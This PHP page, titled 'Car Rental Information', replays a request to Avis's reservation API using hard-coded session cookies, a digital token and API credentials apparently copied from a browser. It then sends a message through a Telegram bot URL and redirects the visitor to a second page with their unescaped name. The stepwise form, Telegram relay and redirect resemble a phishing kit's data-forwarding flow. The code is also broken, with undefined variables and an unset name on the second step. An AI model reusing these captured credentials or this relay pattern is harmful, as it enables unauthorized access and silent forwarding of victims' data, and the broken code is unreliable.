
<?php
session_start();
$try  = 0;

if (isset($_POST['try'])) {
  $try = $_POST['try']+1;
  if ($try == 1){
    $username = $_POST['name'];

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://www.avis.com/webapi/reservation/vehicles',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS =>'{"rqHeader":{"brand":"","locale":"en_US"},"nonUSShop":true,"pickInfo":"ANB","pickDate":"05/04/2023","pickTime":"12:00 PM","dropInfo":"ANB","dropDate":"05/05/2023","dropTime":"12:00 PM","couponNumber":"","couponInstances":"","couponRateCode":"","discountNumber":"","rateType":"","residency":"US","age":25,"wizardNumber":"","lastName":"","userSelectedCurrency":"","selDiscountNum":"","promotionalCoupon":"","preferredCarClass":"","membershipId":"","noMembershipAvailable":false,"corporateBookingType":"","enableStrikethrough":"true","amazonGCPayLaterPercentageVal":"","amazonGCPayNowPercentageVal":"","corporateEmailID":""}',
        CURLOPT_HTTPHEADER => array(
            'bookingType: car',
            'channel: Digital',
            'Content-Type: application/json',
            'deviceType: bigbrowser',
            'password: AVISCOM',
            'userName: AVISCOM',
            'Referer: https://www.avis.com/en/locations/us/fl/clearwater',
            'digital-token: eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..u3vyj-evF8Szixk0.wDptc4ZiYjMUNZhH0hqsfsM2fmrsW2NoPoWzUijinP7WfXjuA7VvjW6ov1nvjfYHVqiqy21MfsW4GtfQJz4TDZ8_LVir3kjPdAkMP6o-E4gw_mrIWDyMQUnfEf2pOd8kcqOBLHIyZ7Ho9wCXpCIQbOMcTARx89nNic-mhPqQvsRwmyG9bHaD9mjKeZCv4MsEd7vsW0GoYmUpoLHMlNVHbbi9C6YuvdBVFwTg8W1H4w-hfpjwQmzkAwZvBlZ0H5cpn6zH6CfNsYOOBrXRR2uMviYrIJdwaZtRQoln0ihywP2cfKoZwyezGeG56Sg.vkg38qtw6OXsftAs3MX4Fw',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'cookie: APISID=527d1a64-49da-4dfc-81d6-192274de5f0a; datacenter=cdal; digital-token=ec18d7d8-8072-4c5e-b849-ec146ff6782a-11-cdal-ho3739; visitorId=cdal-Afc89ec97-8e87-4024-a6fd-c8ddea2bf9e4; region=euwest1; akaalb_production_config=~op=avis_euwest1_webapi_private_lbid:avis-webapi-euwest1-aws|avis_com:avis-us-digital-euwest1-aws|~rv=5~m=avis-webapi-euwest1-aws:0|avis-us-digital-euwest1-aws:0|~os=7f956ca2417c5e686d715889b6a30f65~id=b467847cfe97e0c736a0f77ed97dd52b; optimizelyEndUserId=oeu1682930375140r0.7989460495449099; RT="z=1&dm=avis.com&si=9fcc04d4-4149-46b6-96a2-69fd25cc76f0&ss=lh4labu8&sl=0&tt=0&bcn=%2F%2F173bf106.akstat.io%2F&nu=43hl6rgh&cl=au6"; _gcl_au=1.1.552469630.1682930387; APISID=ebcdf416-59d0-4ced-b534-c42e445ff74b; JSESSIONID=oA92VwKO6qpDgGsXajS5aP0zSJKh-1LUI6N0kssT.d10vprecmapp01; datacenter=cdal; digital-token=ec18d7d8-8072-4c5e-b849-ec146ff6782a-11-cdal-ho3739; _pxhd=0706403da29df8143b35bb1cb07e0fb866bb500eda8443375f4616f498332906:b74c1355-e7e5-11ed-bf55-52417566596e'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    echo $response;

  }
  
  $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message);
  $result = file_get_contents($url);
  $result = json_decode($result, true);
    
  if (isset($result['ok'])) {
    if (isset($result['result'])) {
    }
  } else {
 $error = 1;
  }
  
  if($try == 2){
    header("Location: second.php?name=$username");
    }
} 
?>

<!DOCTYPE html>
<html>

<head>
    <title>
        Car Rental Information
    </title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
</head>

<body>
    <form id='myForm' name="theForm" action="" autocomplete="off" method="post">
        <input type="hidden" name="try" value="<?=(isset($_POST['try']) ? $_POST['try']+1 : 0)?>">
        <input type="button" value="NEXT" style="cursor: pointer;" onclick="document.getElementById('myForm').submit()">
    </form>  
</body>
</html>